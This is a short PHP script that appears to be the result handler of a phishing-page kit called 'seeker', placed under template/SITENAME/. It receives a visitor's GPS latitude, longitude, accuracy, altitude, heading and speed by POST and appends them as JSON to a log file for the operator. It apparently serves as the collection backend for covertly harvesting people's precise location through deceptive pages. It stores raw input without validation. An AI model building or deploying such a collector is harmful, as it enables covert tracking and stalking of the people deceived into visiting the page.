<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $status = $_POST['Status'];
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $acc = $_POST['Acc'];
  $alt = $_POST['Alt'];
  $dir = $_POST['Dir'];
  $spd = $_POST['Spd'];

  $data = array(
    'status' => $status,
    'lat' => $lat,
    'lon' => $lon,
    'acc' => $acc,
    'alt' => $alt,
    'dir' => $dir,
    'spd' => $spd);

  $json_data = json_encode($data);

  // Path relative to seeker root: template/SITENAME/result_handler.php -> ../../logs/result.txt
  // But to be safe, use absolute path via seeker root detection
  $base_dir = dirname(dirname(dirname(__FILE__)));  // Goes up: template/SITENAME/ -> template/ -> seeker/
  $f = fopen($base_dir . '/logs/result.txt', 'a');
  fwrite($f, $json_data . "\n---NEXT---\n");
  fclose($f);
}

?>
